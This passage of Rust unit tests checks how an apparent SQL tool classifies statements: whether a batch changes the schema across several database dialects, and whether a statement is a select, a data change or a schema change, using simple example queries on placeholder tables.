    fn changes_schema_spots_ddl_anywhere_in_the_batch() {
        use sqlly_core::DatabaseType::{MySql, Postgres, SqlServer, Sqlite};
        assert!(changes_schema_for(Postgres, "CREATE TABLE t (id int)"));
        assert!(changes_schema_for(
            Postgres,
            "SELECT 1; ALTER TABLE t ADD COLUMN note text"
        ));
        assert!(changes_schema_for(MySql, "ALTER TABLE t DROP COLUMN note"));
        assert!(changes_schema_for(
            MySql,
            "ALTER TABLE t MODIFY COLUMN note varchar(20)"
        ));
        assert!(changes_schema_for(
            Sqlite,
            "ALTER TABLE t RENAME COLUMN a TO b"
        ));
        assert!(changes_schema_for(SqlServer, "SELECT 1\nGO\nDROP VIEW v"));
        assert!(changes_schema_for(
            SqlServer,
            "IF OBJECT_ID('t') IS NOT NULL DROP TABLE t"
        ));
        assert!(changes_schema_for(MySql, "RENAME TABLE a TO b"));
    }

    #[test]
    fn changes_schema_ignores_data_statements_and_quoted_keywords() {
        use sqlly_core::DatabaseType::{Postgres, SqlServer};
        assert!(!changes_schema_for(Postgres, "SELECT 'drop table t' AS s"));
        assert!(!changes_schema_for(Postgres, "-- create table x\nSELECT 1"));
        assert!(!changes_schema_for(Postgres, "UPDATE t SET note = 'alter'"));
        assert!(!changes_schema_for(Postgres, "TRUNCATE TABLE t"));
        assert!(!changes_schema_for(SqlServer, "GRANT SELECT ON t TO bob"));
        assert!(!changes_schema_for(Postgres, "SELECT \"create\" FROM t"));
    }

    #[test]
    fn hint_select_with_cte() {
        assert_eq!(
            statement_kind_hint("WITH cte AS (SELECT 1) SELECT * FROM cte"),
            StatementKindHint::Select
        );
    }

    #[test]
    fn hint_update_is_dml() {
        assert_eq!(
            statement_kind_hint("UPDATE t SET x = 1"),
            StatementKindHint::Dml
        );
    }

    #[test]
    fn hint_truncate_is_ddl() {
        assert_eq!(
            statement_kind_hint("TRUNCATE TABLE t"),
            StatementKindHint::Ddl
        );
    }

    #[test]
    fn hint_leading_comment_skipped() {
        assert_eq!(
            statement_kind_hint("-- note\nSELECT 1"),
            StatementKindHint::Select
        );
    }

    #[test]
    fn hint_multi_statement_uses_first() {
        assert_eq!(
            statement_kind_hint("DELETE FROM t; SELECT 1"),
            StatementKindHint::Dml
        );
    }
}
